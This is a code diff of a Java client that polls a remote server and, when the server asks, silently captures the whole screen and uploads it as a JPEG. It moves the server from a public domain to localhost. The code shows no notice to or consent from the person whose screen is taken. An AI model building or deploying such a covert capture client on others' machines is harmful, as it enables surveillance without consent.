@@ -19,34 +19,45 @@ import ws.JSONWS;
 
 public class Screenshot
 {
-    public static final String ipServer = "barivende.com"; //:8080
-    //public static final String ipServer = "192.168.5.119:8080";
+//    public static final String ipServer = "viewdevs.com.ar"; //:8080
+    public static final boolean verbose = false;
+    public static final String ipServer = "localhost:9000";
+    public static final String fullURLWS = "http://" + ipServer + "/api/";
+    public static final String rutaSO = "C:\\temp\\screenshots\\";
     public static void main(String[] args) throws AWTException, IOException, InterruptedException
     {
         int contador = 0;
         while(true)
         {
-            String respuesta = JSONWS.sendData("http://" + ipServer + "/Machete/reportarme", "", "");
+            String respuesta = JSONWS.sendData( false, fullURLWS + "remote/reportarme", "", "");
             
-            boolean pidioScreenshot = Boolean.valueOf(respuesta);
+            if(respuesta != null && respuesta.trim().length() > 0 )
+            {
+                boolean pidioScreenshot = Boolean.valueOf(respuesta);
+                
+                if(pidioScreenshot)
+                {
+                    System.out.println("debo sacar foto");
+                    System.out.println("SCREEN SIZE:" + new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+                    BufferedImage image = new Robot().createScreenCapture(new Rectangle(1920,1080));
+                    Date timestamp = new Date();
+                    File foto = new File(rutaSO + File.separator + "screenshot-"+ contador+ ".jpg");
+                    ImageIO.write(image, "jpeg",foto ); //+ timestamp.getTime() 
+
+                    System.out.println("resultado de subir archivo: " + JSONWS.sendFile(fullURLWS + "remote/subirFoto", "foto", foto));
+
+                    contador++;
+                }
+                else
+                {
+                    if(verbose)
+                    {
+                        System.out.println("no saco foto");
+                    }
+                }
+            }
             
-            if(pidioScreenshot)
-            {
-                System.out.println("debo sacar foto");
-                
-                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
-                Date timestamp = new Date();
-                File foto = new File("C://screenshot/screenshot-"+ contador+ ".jpg");
-                ImageIO.write(image, "jpeg",foto ); //+ timestamp.getTime() 
-                
-                System.out.println("resultado de subir archivo: " + JSONWS.sendFile("http://" + ipServer + "/Machete/subirFoto", "foto", foto));
-                
-                contador++;
-            }
-            else
-            {
-                System.out.println("no saco foto");
-            }
+            
             //System.out.println("respuesta de reportarme: " + respuesta);
             
             
